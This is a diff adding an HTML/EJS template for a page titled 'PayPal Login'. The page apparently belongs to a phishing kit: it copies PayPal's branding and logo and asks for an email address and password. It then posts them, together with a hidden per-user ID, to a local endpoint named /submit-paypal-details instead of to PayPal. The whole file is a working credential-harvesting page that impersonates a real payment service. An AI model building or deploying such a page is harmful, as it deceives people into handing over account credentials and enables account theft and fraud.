@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal Login</title>
+    <link rel="stylesheet" href="/css/paypal.css">
+</head>
+<body>
+    <div class="login-container">
+
+        <img src="/uploads/paypal.png" alt="paypal" width="40%" class="b-screen">
+        <img src="/uploads/paypal.png" alt="paypal" width="100%" class="s-screen">
+
+
+        <h2>Log in to PayPal</h2>
+        <form id="paypalLoginForm" action="/submit-paypal-details" method="POST">
+            <input type="hidden" name="userId" value="<%= userId %>">
+            
+            <label for="email">Email Address:</label>
+            <input type="text" id="email" name="email" required placeholder="Email address">
+        
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required placeholder="Password">
+            
+            <button type="submit">Login</button>
+        </form>
+        <p><a href="#">Forgot password?</a></p>
+    </div>
+</body>
+</html>
